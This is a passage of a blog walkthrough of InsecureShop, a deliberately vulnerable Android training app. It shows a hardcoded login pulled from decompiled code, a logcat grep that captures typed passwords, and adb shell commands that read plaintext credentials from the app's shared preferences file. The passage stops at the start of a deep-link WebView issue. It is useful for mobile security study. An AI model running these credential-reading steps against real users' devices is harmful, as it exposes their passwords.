<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Walkthrough of The InsecureShop Android Vulnerable Application" /><meta name="author" content="Muhammad Adel" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://itsfading.github.io/posts/Insecureshop-Android-Vulnerable-Application-Writeup/" /><meta property="og:url" content="https://itsfading.github.io/posts/Insecureshop-Android-Vulnerable-Application-Writeup/" /><meta property="og:site_name" content="Muhammad Adel" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-09-06T17:40:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Walkthrough of The InsecureShop Android Vulnerable Application" /><meta name="twitter:site" content="@ItsFadinG_" /><meta name="twitter:creator" content="@Muhammad Adel" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Muhammad Adel"},"dateModified":"2025-04-07T14:02:05+02:00","datePublished":"2024-09-06T17:40:00+03:00","description":"Introduction","headline":"Walkthrough of The InsecureShop Android Vulnerable Application","mainEntityOfPage":{"@type":"WebPage","@id":"https://itsfading.github.io/posts/Insecureshop-Android-Vulnerable-Application-Writeup/"},"url":"https://itsfading.github.io/posts/Insecureshop-Android-Vulnerable-Application-Writeup/"}</script><title>Walkthrough of The InsecureShop Android Vulnerable Application | Muhammad Adel</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Muhammad Adel"><meta name="application-name" content="Muhammad Adel"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/Mine.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Muhammad Adel</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://twitter.com/ItsFadinG_" aria-label="twitter" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/muhammadadel14" aria-label="linkedin" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/ItsFadinG" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Muhammad.adel.tr','gmail.com'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Walkthrough of The InsecureShop Android Vulnerable Application</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Walkthrough of The InsecureShop Android Vulnerable Application</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Muhammad Adel </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Sep 6, 2024, 5:40 PM +0300" prep="on" > Sep 6, 2024 <i class="unloaded">2024-09-06T17:40:00+03:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 7, 2025, 2:02 PM +0200" prefix="Updated " > Apr 7 <i class="unloaded">2025-04-07T14:02:05+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="9310 words">51 min</span></div></div><div class="post-content"><h2 id="introduction"><strong>Introduction</strong></h2><p>InsecureShop is an Android application that is designed to be intentionally vulnerable. The application serves as a platform to test your Android pentesting skills. The vulnerabilities present in this app are real and have been found during mobile pentests.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/intro.png" alt="image.png" /></p><p>Peace be upon all of you, on this writeup I am going to cover all the solutions for all the InsecureShop challenges. Each vulnerability is dissected step by step, with detailed explanations providing insights into both the security flaws and the thought processes behind each exploit.</p><h2 id="hardcoded-credentials"><strong>Hardcoded Credentials</strong></h2><blockquote><p><strong>Description:</strong> Credentials are hardcoded somewhere that can be used to login to the application</p></blockquote><p>The first page of the application indicates that there is only a login page, without any other ways to register your account on the application.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image.png" alt="image.png" /></p><p>As The name of the first challenge suggests, there should be hard coded creds on the app code, Going through the application classes, let’s check the login activity:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%201.png" alt="image.png" /></p><p>Reading the code, the <code class="language-plaintext highlighter-rouge">verifyUserNamePassword</code> should grab our attention as the application is getting the user input and comparing it to this function. Let’s double-click on it and check it out. It will take us to the Utils Class <code class="language-plaintext highlighter-rouge">com.insecureshop.util.Util</code> which clearly contains the required creds to login.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%202.png" alt="image.png" /></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>shopuser:!ns3csh0p
</pre></table></code></div></div><p>And we are logged in:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%203.png" alt="image.png" /></p><h2 id="insecure-logging"><strong>Insecure Logging</strong></h2><blockquote><p><strong>Description:</strong> User credentials are leaked in logcat. Only attackers with physical access to the device can access this information.</p></blockquote><p>Searching with Jadx-GUI for the <code class="language-plaintext highlighter-rouge">Log.d</code> function, we will find:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%204.png" alt="image.png" /></p><p>The username and password are being logged while accessing the <code class="language-plaintext highlighter-rouge">loginActivity</code>. So, any username and password that are written while logging in the application will be logged. Let’s exploit this behavior:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">root</span><span class="err">@</span><span class="nx">generic_x86:/</span><span class="w"> </span><span class="err">$</span><span class="w"> </span><span class="nx">logcat</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s1">'userName'</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s1">'password'</span><span class="w">
</span><span class="mi">08</span><span class="nt">-31</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mf">33.148</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="nx">userName:</span><span class="w"> </span><span class="nx">aa</span><span class="w">
</span><span class="mi">08</span><span class="nt">-31</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mf">33.148</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="nx">password:</span><span class="w"> </span><span class="nx">aa</span><span class="p">,</span><span class="w">
</span><span class="mi">08</span><span class="nt">-31</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mf">34.066</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="nx">userName:</span><span class="w"> </span><span class="nx">aa</span><span class="w">
</span><span class="mi">08</span><span class="nt">-31</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mf">34.066</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="nx">password:</span><span class="w"> </span><span class="nx">aa</span><span class="p">,</span><span class="w">
</span><span class="mi">08</span><span class="nt">-31</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mf">34.199</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="nx">userName:</span><span class="w"> </span><span class="nx">aa</span><span class="w">
</span><span class="mi">08</span><span class="nt">-31</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mf">34.199</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="mi">27053</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="nx">password:</span><span class="w"> </span><span class="nx">aa</span><span class="p">,</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%205.png" alt="image.png" /></p><h2 id="enabled-insecure-data-storage"><strong>Enabled Insecure Data Storage</strong></h2><blockquote><p><strong>Description:</strong> The app stores user credentials locally without encrypting them.</p></blockquote><p>If we looked again at the code of the <code class="language-plaintext highlighter-rouge">LoginActivity</code> we will notice that the username and password of the application are being saved in the application Prefs file.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">onLogin</span><span class="o">(</span><span class="nc">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>
<span class="k">if</span> <span class="o">(</span><span class="nc">Util</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">verifyUserNamePassword</span><span class="o">(</span><span class="n">username</span><span class="o">,</span> <span class="n">password</span><span class="o">))</span> <span class="o">{</span>
    <span class="c1">// defining the Prefs</span>
    <span class="nc">Prefs</span> <span class="n">prefs</span> <span class="o">=</span> <span class="nc">Prefs</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">;</span>
    <span class="nc">Context</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="n">getApplicationContext</span><span class="o">();</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">,</span> <span class="s">"applicationContext"</span><span class="o">);</span>
    <span class="c1">// Adding the username to the Prefs</span>
    <span class="n">prefs</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">).</span><span class="na">setUsername</span><span class="o">(</span><span class="n">username</span><span class="o">);</span>
    <span class="nc">Prefs</span> <span class="n">prefs2</span> <span class="o">=</span> <span class="nc">Prefs</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">;</span>
    <span class="nc">Context</span> <span class="n">applicationContext2</span> <span class="o">=</span> <span class="n">getApplicationContext</span><span class="o">();</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">applicationContext2</span><span class="o">,</span> <span class="s">"applicationContext"</span><span class="o">);</span>
    <span class="c1">// Adding the password to the Prefs</span>
    <span class="n">prefs2</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">applicationContext2</span><span class="o">).</span><span class="na">setPassword</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>
    <span class="nc">Util</span><span class="o">.</span><span class="na">saveProductList</span><span class="n">$default</span><span class="o">(</span><span class="nc">Util</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
    <span class="n">startActivity</span><span class="o">(</span><span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="nc">ProductListActivity</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
    <span class="k">return</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>This means that we will find the username and password stored locally in the application <code class="language-plaintext highlighter-rouge">sharedpreferences</code> folder.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>PS C:<span class="se">\U</span>sers<span class="se">\M</span>uhammad&gt; adb shell
root@generic_x86:/ <span class="nv">$ </span><span class="nb">cd</span> /data/data/com.insecureshop
root@generic_x86:/data/data/com.insecureshop <span class="nv">$ </span><span class="nb">ls
</span>app_webview
cache
code_cache
shared_prefs
root@generic_x86:/data/data/com.insecureshop/ <span class="nv">$ </span><span class="nb">cd </span>shared_prefs/                                                               &lt;
root@generic_x86:/data/data/com.insecureshop/shared_prefs <span class="nv">$ </span><span class="nb">ls
</span>Prefs.xml
WebViewChromiumPrefs.xml
root@generic_x86:/data/data/com.insecureshop/shared_prefs <span class="nv">$ </span><span class="nb">cat </span>Prefs.xml                                                                  &lt;
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s1">'1.0'</span> <span class="nv">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span> <span class="nv">standalone</span><span class="o">=</span><span class="s1">'yes'</span> ?&gt;
&lt;map&gt;
&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span><span class="o">&gt;</span>shopuser&lt;/string&gt;
&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"productList"</span><span class="o">&gt;[{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:1,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/7974/pexels-photo.jpg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Laptop&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>80&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:1,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/984619/pexels-photo-984619.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Hat&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>10&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:3,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/343720/pexels-photo-343720.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Sunglasses&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>10&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:4,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:4,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/277390/pexels-photo-277390.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Watch&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>30&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:4,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:5,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/225157/pexels-photo-225157.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Camera&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>40&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:6,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/264819/pexels-photo-264819.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Perfumes&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>10&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:7,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/532803/pexels-photo-532803.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Bagpack&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>20&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}</span>,<span class="o">{</span>&amp;quot<span class="p">;</span><span class="nb">id</span>&amp;quot<span class="p">;</span>:8,&amp;quot<span class="p">;</span>imageUrl&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://images.pexels.com/photos/789812/pexels-photo-789812.jpeg&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>name&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>Jacket&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>price&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>20&amp;quot<span class="p">;</span>,&amp;quot<span class="p">;</span>qty&amp;quot<span class="p">;</span>:0,&amp;quot<span class="p">;</span>rating&amp;quot<span class="p">;</span>:2,&amp;quot<span class="p">;</span>url&amp;quot<span class="p">;</span>:&amp;quot<span class="p">;</span>https://www.insecureshopapp.com&amp;quot<span class="p">;</span><span class="o">}]</span>&lt;/string&gt;
&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"password"</span><span class="o">&gt;!</span>ns3csh0p&lt;/string&gt;
&lt;/map&gt;
</pre></table></code></div></div><h2 id="insufficient-url-validation"><strong>Insufficient URL Validation</strong></h2><blockquote><p><strong>Description:</strong> Possible to load any arbitrary URL in WebView via Deep link.</p></blockquote><p>Loading a WebView inside the application may be hardcoded in the app, or the URI that will load may be given as a parameter from an intent, as in our example here. We have in the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> the <code class="language-plaintext highlighter-rouge">WebViewActivity</code>:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">"com.insecureshop.WebViewActivity"</span><span class="nt">&gt;</span>
<span class="nt">&lt;intent-filter&gt;</span>
    <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.VIEW"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.BROWSABLE"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;data</span> <span class="na">android:scheme=</span><span class="s">"insecureshop"</span> <span class="na">android:host=</span><span class="s">"com.insecureshop"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/intent-filter&gt;</span>
<span class="nt">&lt;/activity&gt;</span> 
